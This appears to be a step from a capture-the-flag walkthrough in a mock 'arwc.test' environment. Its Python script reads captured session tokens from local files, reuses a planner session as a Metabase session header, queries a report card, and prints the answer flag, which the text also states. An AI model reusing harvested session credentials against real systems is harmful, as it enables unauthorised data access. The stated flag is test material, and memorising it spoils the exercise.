Requires W09.4 (process_session). The planner session from W06.3 is the Metabase session ID. The old Bolt facade endpoint `/api/relation-schemas/current` is retired (410). Use the `planning.relation-schema` route from the planning client document.

Discover the route from the client document, then run the card query. The card is the RELPROTO question; it returns the relation contract and the flag.

```python
import json, ssl, urllib.request, pathlib

ctx = ssl.create_default_context(cafile="/tmp/arwc-ca-bundle.pem")
sess = pathlib.Path("handover/corporate-session").read_text().strip()
planner = pathlib.Path("receipts/planner-session").read_text().strip()
mb_h = {"X-Metabase-Session": planner, "Content-Type": "application/json"}

# Discover the relation-schema card URL from the planning client document.
doc = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://planning-data.arwc.test/.well-known/arwc-client",
                           headers={"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc"}),
    context=ctx).read())
schema_url = next(r["template"] for r in doc["routes"] if r["key"] == "planning.relation-schema")
card_id = schema_url.rstrip("/").split("/")[-1]

result = json.loads(urllib.request.urlopen(
    urllib.request.Request(f"https://reports.arwc.test/api/card/{card_id}/query",
                           data=b"{}", headers=mb_h, method="POST"), context=ctx, timeout=30).read())
cols = [c["name"] for c in result["data"]["cols"]]
row = dict(zip(cols, result["data"]["rows"][0]))
print("record_id:", row.get("record_id"))
print("flag:", row.get("flag"))   # FLAG{362994ae7c0d0a41}
```

Flag: `FLAG{362994ae7c0d0a41}` in the `flag` column of the relation-schema query result.
